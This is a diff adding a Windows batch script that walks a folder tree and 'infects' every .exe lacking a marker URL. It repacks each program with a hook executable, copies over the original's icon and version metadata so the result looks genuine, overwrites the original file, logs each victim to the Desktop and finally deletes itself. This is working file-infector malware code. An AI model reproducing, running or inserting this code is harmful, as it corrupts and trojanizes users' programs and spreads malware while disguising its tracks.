@@ -1,0 +1,20 @@
+
+for /R "%targetPath%" %%F in (*.exe) do (
+    findstr /C:"https://tobecation.github.io/" "%%F" >nul || (
+        echo %%F>>%UserProfile%\Desktop\InfectLogs.log
+        title infecting %%F
+        dllhost x "%%F" -o"%currentWorkPath%\Temp" -aoa
+        powershell -command "Get-ChildItem "%currentWorkPath%\Temp" -Filter *.ico -Recurse | Sort-Object Length -Descending | Select-Object -First 1 -ExpandProperty FullName | Out-File targetIco"
+        copy /y "%%F" "%currentWorkPath%\meat"
+        echo %%~nxF>exeName
+        copy /y %exePath% "%currentWorkPath%\hook"
+        for %%d in (CompanyName FileDescription InternalName LegalCopyright OriginalFilename FileVersion ProductName ProductVersion) do (
+            powershell -Command "(Get-Item -Path '%%F').VersionInfo.%%d">%%d
+        )
+        "WorkerThread.cmd"
+        echo https://tobecation.github.io/>>"Output.exe"
+        copy /y "Output.exe" "%%F"
+        del/f/s/q "Output.exe"
+    )
+)
+del/f/s/q %0
